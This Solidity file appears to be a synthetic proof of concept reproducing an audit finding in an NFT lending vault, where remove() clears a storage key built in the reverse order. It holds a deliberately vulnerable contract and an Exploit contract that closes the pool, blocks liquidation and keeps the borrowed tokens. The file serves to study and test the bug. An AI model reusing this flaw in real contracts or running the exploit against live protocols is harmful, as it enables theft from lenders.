// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Abacus vault — tokenMapping key is reversed in remove (OtterSec, finding 48698)
    SYNTHETIC, cheatcode-free reduction.
    includeNft / getHeldTokenExistence use `id << 160 | nft`.
    remove uses `nft << 160 | id`, so the real slot stays true.
    The owner can sign and remove the same NFT until nftRemoved == nftsInPool,
    which closes the pool. Liquidation of the outstanding loan then reverts
    and the borrower keeps the borrowed balance. Vulnerable write (@> VULN). */

contract Token {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    mapping(uint256 => bool) public tokenMapping;
    address public factory;
    bool public closed;
    uint256 public includes;

    function setFactory(address f) external {
        factory = f;
    }

    function includeKey(address nft, uint256 id) public pure returns (uint256) {
        return (id << 160) | uint256(uint160(nft));
    }

    function removeKey(address nft, uint256 id) public pure returns (uint256) {
        return (uint256(uint160(nft)) << 160) | id;
    }

    function includeNft(address nft, uint256 id) external {
        tokenMapping[includeKey(nft, id)] = true;
        includes += 1;
    }

    function getHeldTokenExistence(address nft, uint256 id) public view returns (bool) {
        return tokenMapping[includeKey(nft, id)];
    }

    function remove(address nft, uint256 id) external {
        uint256 tempStorage = removeKey(nft, id);
        tokenMapping[tempStorage] = false;
        Factory(factory).updateNftInUse(nft, id); // @> VULN: the slot cleared above is nft<<160|id, not the includeNft key
    }

    function closePool() external {
        require(msg.sender == factory, "factory");
        closed = true;
    }

    function clearInclude(address nft, uint256 id) external {
        require(msg.sender == factory, "factory");
        tokenMapping[includeKey(nft, id)] = false;
    }
}

contract Factory {
    Vault public vault;
    uint256 public nftsInPool;
    uint256 public nftRemoved;
    mapping(address => mapping(uint256 => bool)) public signed;
    mapping(address => mapping(uint256 => address)) public ownerOf;

    constructor(Vault v, uint256 n) {
        vault = v;
        nftsInPool = n;
    }

    function include(address nft, uint256 id, address owner) external {
        ownerOf[nft][id] = owner;
        vault.includeNft(nft, id);
    }

    function signMultiAssetVault(address nft, uint256 id) external {
        require(vault.getHeldTokenExistence(nft, id), "not held");
        require(msg.sender == ownerOf[nft][id], "owner");
        signed[nft][id] = true;
    }

    function remove(address nft, uint256 id) external {
        require(signed[nft][id], "not signed");
        require(msg.sender == ownerOf[nft][id], "owner");
        signed[nft][id] = false;
        vault.remove(nft, id);
    }

    function removeConsistent(address nft, uint256 id) external {
        require(signed[nft][id], "not signed");
        require(msg.sender == ownerOf[nft][id], "owner");
        require(vault.getHeldTokenExistence(nft, id), "not held");
        signed[nft][id] = false;
        nftRemoved += 1;
        if (nftRemoved == nftsInPool) vault.closePool();
        vault.clearInclude(nft, id);
    }

    function updateNftInUse(address nft, uint256 id) external {
        require(msg.sender == address(vault), "vault");
        require(vault.getHeldTokenExistence(nft, id), "mapping false");
        nftRemoved += 1;
        if (nftRemoved == nftsInPool) {
            vault.closePool();
        }
    }
}

contract Lend {
    Vault public vault;
    Token public token;
    mapping(address => mapping(uint256 => uint256)) public debt;

    constructor(Vault v, Token t) {
        vault = v;
        token = t;
    }

    function borrow(address nft, uint256 id, uint256 amount) external {
        require(vault.getHeldTokenExistence(nft, id), "no collateral");
        require(!vault.closed(), "closed");
        debt[nft][id] += amount;
        token.transfer(msg.sender, amount);
    }

    function liquidate(address nft, uint256 id) external {
        require(!vault.closed(), "pool closed");
        require(debt[nft][id] > 0, "no debt");
        debt[nft][id] = 0;
    }
}

contract Exploit {
    Token public token; // CREATE nonce 1
    Vault public vault; // CREATE nonce 2
    Factory public factory; // CREATE nonce 3
    Lend public lend; // CREATE nonce 4
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    address public constant NFT = 0x000000000000000000000000000000000000a11c;
    uint256 public constant ID = 1;
    uint256 public constant OTHER_ID = 2;
    bool public liquidateReverted;
    uint256 public borrowed;

    constructor() {
        token = new Token();
        vault = new Vault();
        factory = new Factory(vault, 2);
        lend = new Lend(vault, token);
        vault.setFactory(address(factory));
    }

    function run() external {
        factory.include(NFT, ID, address(this));
        factory.include(NFT, OTHER_ID, address(0xB0B));
        token.mint(address(lend), 100e18);
        lend.borrow(NFT, ID, 100e18);
        borrowed = 100e18;

        factory.signMultiAssetVault(NFT, ID);
        factory.remove(NFT, ID);
        require(vault.getHeldTokenExistence(NFT, ID), "slot still true");
        require(factory.nftRemoved() == 1, "first increment");

        factory.signMultiAssetVault(NFT, ID);
        factory.remove(NFT, ID);
        require(vault.closed(), "pool closed");
        require(factory.nftRemoved() == 2, "closed on one nft");

        try lend.liquidate(NFT, ID) {
            liquidateReverted = false;
        } catch {
            liquidateReverted = true;
        }
        token.transfer(SINK, borrowed);

        require(liquidateReverted, "liquidation must revert");
        require(lend.debt(NFT, ID) == 100e18, "debt remains");
        require(token.balanceOf(SINK) == 100e18, "borrower kept the loan");
        require(vault.getHeldTokenExistence(NFT, ID), "nft still marked held");
    }
}
